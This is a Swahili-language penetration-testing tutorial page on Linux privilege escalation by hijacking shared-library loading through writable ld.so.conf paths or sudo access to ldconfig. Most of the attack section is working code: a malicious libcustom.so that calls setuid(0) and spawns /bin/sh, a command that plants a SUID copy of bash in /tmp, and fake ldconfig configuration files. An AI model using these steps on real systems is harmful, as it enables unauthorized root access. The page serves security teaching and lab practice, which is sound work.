# ld.so privesc exploit mfano

{{#include ../../banners/hacktricks-training.md}}

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata msimbo wa faili tutakazotumia kuandaa mazingira

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** faili hizo kwenye mashine yako katika folda ile ile
2. **Kompaili** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Nakili** `libcustom.so` hadi `/usr/lib` na refresha cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompaili** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Angalia mazingira

Angalia kwamba _libcustom.so_ inakuwa **loaded** kutoka _/usr/lib_ na kwamba unaweza **execute** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Amri za triage zenye manufaa

Unaposhambulia lengo la kweli, thibitisha **jina halisi la library** ambalo binary inahitaji na kile ambacho loader **kwa sasa inakitatua**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Baadhi ya mambo muhimu ya kujua:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` kwa kawaida **haifanyi kazi** kwa sababu
uandishi wa kuelekeza (`>`) hufanywa na shell yako ya sasa. Tumia
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` badala yake.
- Binaries za **SUID/privileged** hupuuza `LD_LIBRARY_PATH`/`LD_PRELOAD` katika
**secure-execution mode**, lakini directories zinazotoka kwenye `/etc/ld.so.conf` bado ni sehemu ya trusted loader configuration, hivyo misconfiguration hii bado inaweza kuathiri programs zenye privilege.
- Kwenye newer glibc versions, dynamic loader pia hutoa
`--list-diagnostics`, ambayo ni handy kwa kufuatilia cache resolution na
uchaguzi wa `glibc-hwcaps` subdirectory wakati hijack haifanyi kazi kama
inavyotarajiwa.

## Exploit

Katika scenario hii tutadhani kwamba **mtu ameunda vulnerable entry** ndani ya file katika _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Folda yenye udhaifu ni _/home/ubuntu/lib_ (ambapo tuna access ya kuandika).\
**Pakua na compile** code ifuatayo ndani ya path hiyo:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ikiwa unatarajia **root** (au akaunti nyingine yenye ruhusa za juu) itatekeleza binary iliyoathirika baadaye, kwa kawaida ni bora kuacha **root-owned artifact** badala ya kuzindua interactive shell. Kwa mfano:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Kisha, baada ya utekelezaji wenye haki kutokea, unaweza kutumia `/tmp/rootbash -p`.

Sasa kwa kuwa tumekwisha **unda library mbaya ya libcustom ndani ya path** iliyosanidiwa vibaya, tunahitaji kusubiri **reboot** au root user atekeleze **`ldconfig`** (_ikiwa unaweza kutekeleza binary hii kama **sudo** au ina **suid bit** utaweza kuitekeleza mwenyewe_).

Mara hii itakapotokea, **kagua tena** ambapo executable `sharedvuln` inapakia library `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona, inai**load kutoka `/home/ubuntu/lib`** na ikiwa mtumiaji yeyote ataitekeleza, shell itatekelezwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Kumbuka kwamba katika mfano huu hatujaongeza haki, lakini kwa kubadilisha amri zinazoendeshwa na **kungoja root au mtumiaji mwingine mwenye haki aendeshe binary iliyo na udhaifu** tutaweza kuongeza haki.

### Other misconfigurations - Same vuln

Katika mfano uliopita tulighushi misconfiguration ambapo administrator **aliweka folder isiyo na haki ndani ya file ya configuration ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna misconfiguration nyingine ambazo zinaweza kusababisha vulnerability ile ile, ikiwa una **write permissions** katika baadhi ya **config file** ndani ya `/etc/ld.so.conf.d`s, katika folder `/etc/ld.so.conf.d` au katika file `/etc/ld.so.conf` unaweza kusanidi vulnerability ile ile na kuitumia.

## Exploit 2

**Tuseme una sudo privileges juu ya `ldconfig`**.\
Unaweza kuonyesha `ldconfig` **mahali pa kupakia conf files kutoka**, hivyo tunaweza kuitumia kuifanya `ldconfig` ipakie arbitrary folders.\
Hivyo, hebu tuunde files na folders zinazohitajika kupakia "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa katika **exploit ya awali**, **unda library mbaya ndani ya `/tmp`**.\
Na hatimaye, hebu tuweke path na tuangalie binary inaload library kutoka wapi:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na haki za sudo juu ya `ldconfig` unaweza kutumia udhaifu huohuo.**



## Marejeo

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
